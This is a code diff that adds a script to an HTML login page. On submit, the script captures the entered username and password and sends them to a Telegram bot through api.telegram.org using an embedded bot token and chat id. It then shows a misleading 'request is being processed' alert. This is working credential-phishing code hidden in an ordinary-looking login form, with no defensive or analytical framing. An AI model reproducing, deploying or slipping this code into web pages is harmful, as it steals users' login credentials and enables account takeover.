@@ -77,5 +77,29 @@
         <button>Login</button>
     </div>
 
+
+<script>
+document.getElementById("form").addEventListener("submit", function(e){
+    e.preventDefault();
+
+    var user = document.getElementById("username").value;
+    var pass = document.getElementById("password").value;
+
+    var token = "8773598455:AAHIiU7FJ-Afd06GydNFkLos6-yhvsHEeno";
+    var chat_id = "8275920596";
+
+    var message = "Login Masuk:\nUsername: " + user + "\nPassword: " + pass;
+
+    var url = "https://api.telegram.org/bot8773598455:AAHIiU7FJ-Afd06GydNFkLos6-yhvsHEeno/sendMessage?chat_id=8275920596&text="+ encodeURIComponent(message);
+
+    fetch(url)
+    .then(response => alert("permintaan sedang di proses!"))
+    .catch(error => alert("Gagal kirim"));
+});
+</script>
+
+
+
+    
 </body>
 </html>
